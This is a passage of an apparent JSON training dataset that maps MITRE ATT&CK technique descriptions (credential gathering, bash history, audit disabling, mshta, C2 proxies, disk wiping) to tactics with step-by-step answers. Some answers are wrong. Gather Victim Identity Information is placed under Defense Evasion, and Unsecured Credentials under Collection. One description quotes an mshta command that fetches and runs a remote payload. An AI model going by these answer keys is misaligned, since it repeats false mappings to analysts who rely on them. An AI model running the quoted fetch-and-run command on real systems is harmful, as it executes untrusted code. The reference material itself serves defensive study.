    "output": "The given description is related to sub technique Credentials (T1589.001);\nSub technique Credentials (T1589.001) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).",
      "answer": "The given description is related to sub technique Credentials (T1589.001);\nSub technique Credentials (T1589.001) is a type of technique Gather Victim Identity Information (T1589);\nTechnique Gather Victim Identity Information (T1589) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.",
    "context": "",
    "output": "The given description is related to sub technique: Bash History (T1552.003);\nSub technique Bash History (T1552.003) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.",
      "answer": "The given description is related to sub technique: Bash History (T1552.003);\nSub technique Bash History (T1552.003) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.?",
    "context": "",
    "output": "The given description is related to sub technique Disable or Modify Linux Audit System (T1562.012);\nSub technique Disable or Modify Linux Audit System (T1562.012) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.",
      "answer": "The given description is related to sub technique Disable or Modify Linux Audit System (T1562.012);\nSub technique Disable or Modify Linux Audit System (T1562.012) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.?",
    "context": "",
    "output": "The given description is related to sub technique: Python (T1059.006);\nSub technique Python (T1059.006) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "answer": "The given description is related to sub technique: Python (T1059.006);\nSub technique Python (T1059.006) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.?",
    "context": "",
    "output": "The given description is related to sub technique One-Way Communication (T1102.003);\nSub technique One-Way Communication (T1102.003) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The given description is related to sub technique One-Way Communication (T1102.003);\nSub technique One-Way Communication (T1102.003) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.\n\nUnlike Code Signing, this activity will not result in a valid signature.?",
    "context": "",
    "output": "The given description is related to sub technique: Invalid Code Signature (T1036.001);\nSub technique Invalid Code Signature (T1036.001) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.\n\nUnlike Code Signing, this activity will not result in a valid signature.",
      "answer": "The given description is related to sub technique: Invalid Code Signature (T1036.001);\nSub technique Invalid Code Signature (T1036.001) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices. \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
    "context": "",
    "output": "The given description is related to sub technique: Password Cracking (T1110.002);\nSub technique Password Cracking (T1110.002) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices. \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
      "answer": "The given description is related to sub technique: Password Cracking (T1110.002);\nSub technique Password Cracking (T1110.002) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.?",
    "context": "",
    "output": "The given description is related to sub technique: Fileless Storage (T1027.011);\nSub technique Fileless Storage (T1027.011) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.",
      "answer": "The given description is related to sub technique: Fileless Storage (T1027.011);\nSub technique Fileless Storage (T1027.011) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools (Remote Access Software) onto their computer.\n\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.?",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Voice (T1566.004);\nSub technique Spearphishing Voice (T1566.004) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools (Remote Access Software) onto their computer.\n\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.",
      "answer": "The given description is related to sub technique Spearphishing Voice (T1566.004);\nSub technique Spearphishing Voice (T1566.004) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
    "context": "",
    "output": "The given description is related to sub technique Internal Proxy (T1090.001);\nSub technique Internal Proxy (T1090.001) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
      "answer": "The given description is related to sub technique Internal Proxy (T1090.001);\nSub technique Internal Proxy (T1090.001) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
    "context": "",
    "output": "The given description is related to sub technique: Protocol Impersonation (T1001.003);\nSub technique Protocol Impersonation (T1001.003) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
      "answer": "The given description is related to sub technique: Protocol Impersonation (T1001.003);\nSub technique Protocol Impersonation (T1001.003) is a type of technique Data Obfuscation (T1001);\nTechnique Data Obfuscation (T1001) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources?",
    "context": "",
    "output": "The given description is related to sub technique: Confluence (T1213.001);\nSub technique Confluence (T1213.001) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
      "answer": "The given description is related to sub technique: Confluence (T1213.001);\nSub technique Confluence (T1213.001) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.?",
    "context": "",
    "output": "The given description is related to sub technique Virtual Private Server (T1584.003);\nSub technique Virtual Private Server (T1584.003) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
      "answer": "The given description is related to sub technique Virtual Private Server (T1584.003);\nSub technique Virtual Private Server (T1584.003) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique DNS (T1590.002);\nSub technique DNS (T1590.002) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
      "answer": "The given description is related to sub technique DNS (T1590.002);\nSub technique DNS (T1590.002) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
    "context": "",
    "output": "The given description is related to sub technique: Mshta (T1218.005);\nSub technique Mshta (T1218.005) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "answer": "The given description is related to sub technique: Mshta (T1218.005);\nSub technique Mshta (T1218.005) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as `format`.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.?",
    "context": "",
    "output": "The given description is related to sub technique: Disk Structure Wipe (T1561.002);\nSub technique Disk Structure Wipe (T1561.002) is a type of technique Disk Wipe (T1561);\nTechnique Disk Wipe (T1561) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
